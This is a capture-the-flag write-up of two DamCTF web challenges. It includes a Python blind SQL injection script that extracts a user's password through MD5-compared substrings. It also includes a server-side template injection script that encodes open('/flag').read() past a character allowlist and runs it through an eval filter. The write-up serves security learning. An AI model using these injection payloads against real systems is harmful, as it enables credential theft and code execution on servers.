# Bouncy box
The challenge was first completed by one of my teammate which was already scripting it.
I completed it after some minutes. 

The web app provides a bouncy box game. When we loose we can login to register our score.

## First login
We can bypass the login with password `' OR '1'='1` and any username.

## Second login
After logging in to a no sense user, we can see an internal login, which POSTs to `flag/`.
This login requires the username and password of a VIP user, for example `boxy_mcbounce`. 
We can see the VIP users from the provided scoreboard.

This second login is not vulnerable so we need the actual password.
If we are able to login as `boxy_mcbounce` we will retrieve the flag.

## Blind SQLi
The idea is to do a blind SQLi using the first login and incrementally guess the first $n$ chars of the flag.

```
#!/usr/bin/env python3
# aMan

import requests
import string

# attack description:
# since we are always able to login as any user (*) with a true condition
# on the SQL password check, but we want to know the actual psw of
# boxy_mcbounce, which is a VIP user,
# we will exectute the following SQL query to exfiltrate the psw:
# .... AND password=='' OR password[:1]=='x'
# When the second condition is true we successfully login and receive
# code 200 from the POST request
#
# We can iteratively add chars until we get the full password.
#
# Note: since the sql db they are using use case insensitive sring
# comparision, we use md5 hash to make uppercase and lowercase
# distinguible by comparing their hashes.
# Note 2: we add a AND '1'='1 at the end of the query to match the final ' of
# the query
#
# (*) we are able to login as any user for an easy SQL injection
# with "' OR '1'='1" as password
#


def main():
    s = requests.Session()

    # generate the list of chars to try
    letters = list(string.ascii_letters) + \
        list(string.digits) + ["_", "{", "}"]
    print("Trying letters {}".format(''.join(letters)))

    # user to attack
    attacked_user = "boxy_mcbounce"

    # list to save password chars
    final_psw = []

    # the password finish when no char match the next password char
    password_finished = False

    # len of the password
    founded_chars = len(final_psw)

    while(not password_finished):

        for l in range(len(letters)):

            c = letters[l]

            # the SQLi
            password_payload = "' OR MD5(LEFT((SELECT password FROM users WHERE username='boxy_mcbounce'),{}))=MD5('{}') AND '1'='1".format(
                founded_chars+1, ''.join(final_psw)+c)

            post_r = s.post("https://bouncy-box.chals.damctf.xyz/login",
                            json={"username": attacked_user, "password": password_payload, "score": 0})

            if post_r.status_code == 200:
                print(f"Founded char {c}")
                final_psw.append(c)
                founded_chars = len(final_psw)
                break

            # if we just can't login we receive code 403
            # otherwise it's an error code
            if post_r.status_code != 403:
                print(post_r.status_code)
                password_finished = True

    password = "".join(final_psw)  # B0UncYBouNc3
    print(f"Final password for user {attacked_user}: {password}.")
    print('gg')


if __name__ == "__main__":
    main()
```



With the script we get the password `B0UncYBouNc3` for user `boxy_mcbounce`.
By logging in we get the flag.


`dam{b0uNCE_B0UNcE_b0uncE_B0uNCY_B0unce_b0Unce_b0Unc3}`

# Super Secure Translation Implementation

The flag was first submitted by one of my teammates, and I completed the challenge in a similar way afterwards.
https://super-secure-translation-implementation.chals.damctf.xyz/

## How it works
The web app exposes its source code. It basically loads a templates and states to be military proof secure.

- `https://super-secure-translation-implementation.chals.damctf.xyz/`

```
Welcome to the Super Secure Translation Implementation (SSTI)

Who needs security by obscurity when your software anti-hack checks are flawless? Check them out below (this is the code that runs this site):

from flask import Flask, render_template, render_template_string, Response, request
import os

from check import detect_remove_hacks
from filters import *

server = Flask(__name__)

# Add filters to the jinja environment to add string
# manipulation capabilities
server.jinja_env.filters["u"] = uppercase
server.jinja_env.filters["l"] = lowercase
server.jinja_env.filters["b64d"] = b64d
server.jinja_env.filters["order"] = order
server.jinja_env.filters["ch"] = character
server.jinja_env.filters["e"] = e


@server.route("/")
@server.route("/<path>")
def index(path=""):
    # Show app.py source code on homepage, even if not requested.
    if path == "":
        path = "app.py"

    # Make this request hackproof, ensuring that only app.py is displayed.
    elif not os.path.exists(path) or "/" in path or ".." in path:
        path = "app.py"

    # User requested app.py, show that.
    with open(path, "r") as f:
        return render_template("index.html", code=f.read())

@server.route("/secure_translate/", methods=["GET", "POST"])
def render_secure_translate():
    payload = request.args.get("payload", "secure_translate.html")
    print(f"Payload Parsed: {payload}")
    resp = render_template_string(
        """\{ % extends "secure_translate.html" %}{ % block content %}<p>"""
        + str(detect_remove_hacks(payload))
        + """</p><a href="/">Take Me Home</a>{ % endblock %}"""
    )
    return Response(response=resp, status=200)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 30069))
    server.run(host="0.0.0.0", port=port, debug=False)
```

If we open page `https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/` we can see how the templates are loaded:

```
Welcome to the Super Secure Translation Implementation (SSTI)

We use several layers of military grade anti-hack checks to make sure this page is safe from common web vulnerabilities. This page will display your code back to you assuming it passes these checks.

Try it for yourself, but be mindful of HTML special characters like '+'! The output of your command is:

`

Failed Allowlist Check, payload-allowlist={'t', 's', '.', 'm', '_', 'a', 'n'}

[Take Me Home](https://super-secure-translation-implementation.chals.damctf.xyz/)`
```

The `payload` parameter is checked and put in the template, for example:
`https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/?payload=1`
print `1` in the output page, but if we use some chars like:

`https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/?payload=asd`
then the page states which chars were blocked:

`Failed Allowlist Check, payload-allowlist={'a', 's'}`.
So some chars are not allowed.

## Internal source code
In the ZIP folder provided in the challenge files, this message got my attention:

```
What do?  
  
You can use this to spin up your own container that runs pretty much identical  
code to that which backs the challenge. You'll need to patch (& provide) the  
python files ;)
```

And by checking the `Dockerfile` we can see the name of the internal files:

```
Docker wont do globbing properly, so each file goes in on it's own
COPY src/app.py /chal/
COPY src/check.py /chal/
COPY src/filters.py /chal/
# COPY src/limit.py /chal/
```

In the `Dockerfile` we can also see where the flag is exposed:
```
COPY flag /flag
```

By checking the files in the website we can see their contents:

- `https://super-secure-translation-implementation.chals.damctf.xyz/check.py`: it provides the list of the allowed chars

```
from limit import is_within_bounds, get_golf_limit


def allowlist_check(payload, allowlist):
    # Check against allowlist.
    print(f"Starting Allowlist Check with {payload} and {allowlist}")
    if set(payload) == set(allowlist) or set(payload) <= set(allowlist):
        return payload
    print(f"Failed Allowlist Check: {set(payload)} != {set(allowlist)}")
    return "Failed Allowlist Check, payload-allowlist=" + str(
        set(payload) - set(allowlist)
    )


def detect_remove_hacks(payload):
    # This effectively destroyes all web attack vectors.
    print(f"Received Payload with length:{len(payload)}")

    if not is_within_bounds(payload):
        return f"Payload is too long for current length limit of {get_golf_limit()} at {len(payload)} characters. Try locally."

    allowlist = [
        "c",
        "{",
        "}",
        "d",
        "6",
        "l",
        "(",
        "b",
        "o",
        "r",
        ")",
        '"',
        "1",
        "4",
        "+",
        "h",
        "u",
        "-",
        "*",
        "e",
        "|",
        "'",
    ]
    payload = allowlist_check(payload, allowlist)
    print(f"Allowlist Checked Payload -> {payload}")

    return payload
```

- `https://super-secure-translation-implementation.chals.damctf.xyz/filters.py`:  it defines some custom Jinja2 filters, whose names are redefined in the main `app.py` (first source code above)
 
```
import base64


def uppercase(x):
    return x.upper()


def lowercase(x):
    return x.lower()


def b64d(x):
    return base64.b64decode(x)


def order(x):
    return ord(x)


def character(x):
    return chr(x)


def e(x):
    # Security analysts reviewed this and said eval is unsafe (haters).
    # They would not approve this as "hack proof" unless I add some
    # checks to prevent easy exploits.

    print(f"Evaluating: {x}")

    forbidlist = [" ", "=", ";", "\n", ".globals", "exec"]

    for y in forbidlist:
        if y in x:
            return "Eval Failed: Foridlist."

    if x[0:4] == "open" or x[0:4] == "eval":
        return "Not That Easy ;)"

    try:
        return eval(x)
    except Exception as exc:
        return f"Eval Failed: {exc}"
```

-  `https://super-secure-translation-implementation.chals.damctf.xyz/limit.py`: limit the length of the payload

```
import time

from rctf import golf


def get_golf_limit() -> int:
    rctf_host = "https://damctf.xyz/"
    challenge_id = "super-secure-translation-implementation"
    ctf_start = 1636156800
    limit_function = lambda x: (x * 2) + 147

    limit = golf.calculate_limit(rctf_host, challenge_id, ctf_start, limit_function)
    return limit


def is_within_bounds(payload: str) -> bool:

    return len(payload) <= get_golf_limit()
```

## SSTI Attack

If we provide a `{ {6*6} }` as payload, the page contains `36`, which proves we can perform an SSTI attack.

The idea is to open the `flag/` directory and read it's content with `{ {(open("flag").read())|e} }`, which evaluates the content of the statement with the custom Jinja  filter `e` and print it's content in the page.
Several of the chars of the attack however are blocked.

The idea is to compose `open("/flag").read()` by string concatenation. If a char is not allowed we can encode its decimal representation as a sum of numbers composed by digits `1,4,6` and convert it to the ASCII char with the custom filter `ch`.

Example:
`p = chr(112) => (4*4*6+6+6+4)|ch)`

After encoding each char we can join them with `+`, but since it become a space, we use the URL encoded representation `%2B`.



The final attack:

```
#!/usr/bin/env python3
# aMan

import requests
import re


def decompose_number(num):
    # decompose a number as sum of 1,4 and 6.
    # I then realized that 111 or 64 were allowed, by I already prepared this script which was working
    r = num
    sum = []
    while r != 0:
        for n0 in ['1', '4', '6', '4*6', '6*6', '4*4*4', '4*4*6', '4*6*6', '6*6*6'][::-1]:
            n = eval(n0)
            if r - n >= 0:
                sum.append(n0)
                r = r-n
                break

    sum = '+'.join(sum)

    decomposition = sum

    if eval(decomposition) != num:
        print("ERROR IN DECOMPOSITION")
        exit()

    # print(f"{num} = {decomposition}")

    return decomposition


def main():

    s = requests.Session()

    allowlist = ["c", "{", "}", "d", "6", "l",
                 "(", "b", "o", "r", ")", '"', "1", "4", "+", "h", "u", "-", "*", "e", "|", "'"]

    # check if vulnerable to SSTI
    translator = s.post(
        "https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/?payload="+"{ {6*6} }")

    if('36' in str(translator.content)):
        print("SSTI detected")

    # prepare attack string
    attack_str = '(open("/flag").read())'
    attack = list(attack_str)

    # encode the attack string
    encoded_att = []
    valid_to_add = []

    for ch in attack:
        if ch in allowlist:
            valid_to_add.append(ch)
        else:
            # append the consecutive valid chars together e.g. we pair together 're', otherwise it would be 'r'+'e' which makes a longer payload
            if len(valid_to_add) != 0:
                encoded_att.append("+'"+"".join(valid_to_add)+"'")
                valid_to_add = []

            # decompose the number
            numb = decompose_number(ord(ch))
            encoded_att.append(f'+({numb})|ch')  # add |ch to encode the char

    if len(valid_to_add) != 0:
        encoded_att.append("+'"+"".join(valid_to_add)+"'")

    encoded_att = ''.join(encoded_att).strip('+')

    # add |e to evaluate the attack
    encoded_att = '{ {(' + encoded_att + ')|e} }'

    # replace + with url encoded
    encoded_att = encoded_att.replace('+', "%2B")

    print(f"\nSSTI attack: {encoded_att} \n")
    # SSTI attack: { {('(o'%2B(4*4*6%2B6%2B6%2B4)|ch%2B'e'%2B(4*4*6%2B6%2B6%2B1%2B1)|ch%2B'("'%2B(6*6%2B6%2B4%2B1)|ch%2B(4*4*6%2B6)|ch%2B'l'%2B(4*4*6%2B1)|ch%2B(4*4*6%2B6%2B1)|ch%2B'")'%2B(6*6%2B6%2B4)|ch%2B're'%2B(4*4*6%2B1)|ch%2B'd())')|e} }
    # send the attack

    flag_ptt = re.compile("dam{.+}")
    translator = s.post(
        "https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/?payload="+encoded_att)
    flag = flag_ptt.findall(translator.content.decode('utf-8'))[0]
    print(flag)  # dam{p4infu1_all0wl1st_w3ll_don3}


if __name__ == "__main__":
    main()
```


The encoded attack is:

`{ {('(o'%2B(4*4*6%2B6%2B6%2B4)|ch%2B'e'%2B(4*4*6%2B6%2B6%2B1%2B1)|ch%2B'("'%2B(6*6%2B6%2B4%2B1)|ch%2B(4*4*6%2B6)|ch%2B'l'%2B(4*4*6%2B1)|ch%  
2B(4*4*6%2B6%2B1)|ch%2B'")'%2B(6*6%2B6%2B4)|ch%2B're'%2B(4*4*6%2B1)|ch%2B'd())')|e} }`

which sent as payload gives us the flag.

`dam{p4infu1_all0wl1st_w3ll_don3}`
